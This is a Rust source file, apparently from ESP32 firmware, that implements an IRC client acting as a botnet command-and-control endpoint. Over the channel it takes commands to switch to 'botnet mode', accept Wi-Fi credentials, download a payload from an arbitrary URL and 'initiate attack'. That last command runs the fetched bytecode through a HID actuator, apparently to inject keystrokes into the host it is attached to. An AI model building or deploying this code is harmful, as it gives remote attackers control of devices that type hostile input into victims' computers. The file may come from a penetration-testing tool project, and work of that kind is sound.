use anyhow::bail;
use esp_idf_hal::delay::FreeRtos;
use log::{info, warn};
use san_vm::runner;
use san_common::hid_actuator::HidActuator;
use crate::actuator::esp_actuator::EspActuator;
use crate::irc_client::http_client::PayloadHttpClient;
use crate::irc_client::tcp_client::TcpClient;

pub struct IRClient {
    server_name: String,
    channel_name: String,
    username: String,
    tcp_client: TcpClient,
    http_client: PayloadHttpClient,
    received_payload: Option<Vec<u8>>
}

impl IRClient {
    pub fn new(server_address: String, server_port: usize, server_name: String, channel_name: String, username: String) -> anyhow::Result<IRClient> {
        let http_client = PayloadHttpClient::new()?;
        Ok(IRClient {
            server_name,
            channel_name,
            username,
            tcp_client: TcpClient::new(server_address, server_port),
            http_client,
            received_payload: None
        })
    }

    pub fn send_nick(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("NICK {}\r\n", self.username))
    }

    pub fn send_user(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("USER {} * * :{}\r\n", self.username, self.username))
    }

    pub fn register_user(&mut self) -> anyhow::Result<()> {
        loop {
            self.send_nick()?;
            self.send_user()?;
            let response = self.tcp_client.receive_response()?;
            if response.contains("433") {
                self.username.push('_');
            } else {
                break;
            }
        }

        Ok(())
    }

    pub fn join_channel(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("JOIN {}\r\n", self.channel_name))
    }

    pub fn send_pong(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("PONG {}\r\n", self.server_name))
    }

    pub fn send_message(&mut self, message: &str) -> anyhow::Result<()> {
        self.tcp_client.send_command(format!("PRIVMSG {} :{}\r\n", self.channel_name, message))
    }

    pub fn init_timer(&mut self) -> anyhow::Result<()> {
        self.send_message("Initializing device...")?;
        self.tcp_client.receive_motd()?;
        FreeRtos::delay_ms(1000);
        Ok(())
    }

    pub fn send_help(&mut self) -> anyhow::Result<()> {
        self.send_message("MODE,<[AUTO,BOT]> - change between autonomous and botnet mode")?;
        self.send_message("WIFI,<SSID>,<PASS> - send wifi credentials")?;
        self.send_message("PAYLOAD,<URL> - send url of the payload")?;
        self.send_message("INIT - initiate the payload")?;
        self.send_message("IRC_DISCONN - disconnect from server")?;
        self.send_message("TERMINATE - terminate the device")?;
        Ok(())
    }

    pub fn download_payload(&mut self, url: &str) -> anyhow::Result<()> {
        let payload_res = self.http_client.get_payload(url);
        if let Ok(payload) =  payload_res {
            self.received_payload = Some(payload);
            self.send_message("Downloaded payload!")?;
            return Ok(());
        } else if let Err(e) = payload_res {
            warn!("Error while downloading: {}", e);
            return Err(e);
        }

        Ok(())
    }

    pub fn initiate_attack(&mut self) {
        if let Some(payload) = self.received_payload.as_mut() {
            let mut actuator = EspActuator::new();
            actuator.init_actuator();
            actuator.sleep(3000);
            runner::deserialize_bytecode(actuator, payload);
        }
    }

    pub fn send_quit(&mut self) -> anyhow::Result<()> {
        self.tcp_client.send_command(String::from("QUIT\r\n"))
    }

    pub fn handle_messages(&mut self) -> anyhow::Result<()> {
        self.init_timer()?;

        loop {
            let response = self.tcp_client.receive_response()?;
            match response.to_uppercase().as_str() {
                comm if comm.contains("PING") => self.send_pong()?,
                comm if comm.contains(":HELP") => self.send_help()?,
                comm if comm.contains(":MODE,AUTO") => self.send_message("Switching to autonomous mode!")?,
                comm if comm.contains(":MODE,BOT") => self.send_message("Switching to botnet mode!")?,
                comm if comm.contains(":IRC_DISCONN") || comm.contains(":TERMINATE") => {
                    self.send_message("Disconnecting from the server!")?;
                    self.send_quit()?;
                    return Ok(());
                }
                comm if comm.contains(":WIFI,") => self.send_message("Received new wifi credentials, connecting...")?,
                comm if comm.contains(":PAYLOAD,") => {
                    let url = response.split(',').last();
                    if let Some(payload_url) = url {
                        let mut payload_url = payload_url[0..payload_url.find('\r').unwrap()].to_owned();
                        self.download_payload(payload_url.as_str())?;
                    } else {
                        self.send_message("URL not provided!")?;
                    }
                },
                comm if comm.contains(":INIT") => {
                    self.send_message("Initiating attack!")?;
                    self.initiate_attack();
                    self.send_message("Attack finished!")?;
                },
                _ => self.send_message("Unknown command received! Type HELP for list of commands")?
            }
        }
    }

    pub fn client_loop(&mut self) -> anyhow::Result<()> {
        self.tcp_client.connect_to_server()?;
        self.register_user()?;
        self.join_channel()?;
        self.handle_messages()?;
        self.send_quit()?;
        self.tcp_client.close_stream()?;
        Ok(())
    }
}